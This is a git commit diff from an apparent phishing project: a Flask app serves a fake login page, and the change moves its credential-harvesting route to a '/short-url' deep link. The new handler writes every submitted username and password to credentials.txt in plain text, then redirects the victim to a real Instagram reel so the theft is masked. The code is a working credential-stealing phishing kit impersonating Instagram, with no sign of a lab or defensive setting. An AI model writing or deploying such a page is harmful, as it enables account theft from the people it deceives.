36fd6119bb158c4450ecdf951081c8d72a6a5c98
ajaycarlos <ajaypulikkal940@gmail.com>
2026-09-12 17:27:06 +0530

    REEL_ID upadted

--- .venv/bin/activate.fish
+++ .venv/bin/activate.fish
@@ -33,7 +33,7 @@ end
 # Unset irrelevant variables.
 deactivate nondestructive
 
-set -gx VIRTUAL_ENV /home/ajaycarlos/Phishing/.venv
+set -gx VIRTUAL_ENV /home/ajaycarlos/Desktop/Phishing/.venv
 
 set -gx _OLD_VIRTUAL_PATH $PATH
 set -gx PATH "$VIRTUAL_ENV/"bin $PATH
--- app.py
+++ app.py
@@ -7,18 +7,16 @@ app = Flask(__name__)
 def phishing_page():
     return render_template('login.html')
 
-# Route to handle form submission
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form['username']
-    password = request.form['password']
-    
-    # Save credentials to a file
-    with open('credentials.txt', 'a') as f:
-        f.write(f'Username: {username}, Password: {password}\n')
-    
-    # Redirect to Instagram after saving credentials
-    return redirect('https://www.instagram.com')
+# Route to handle deep link
+@app.route('/short-url', methods=['GET', 'POST'])
+def short_url():
+    if request.method == 'POST':
+        # Save credentials to a file
+        with open('credentials.txt', 'a') as f:
+            f.write(f'Username: {request.form["username"]}, Password: {request.form["password"]}\n')
+        # Redirect to Instagram after saving credentials
+        return redirect('https://www.instagram.com/reel/DdJyDTChRSi/')
+    return render_template('login.html')
 
 if __name__ == '__main__':
     app.run(debug=True)
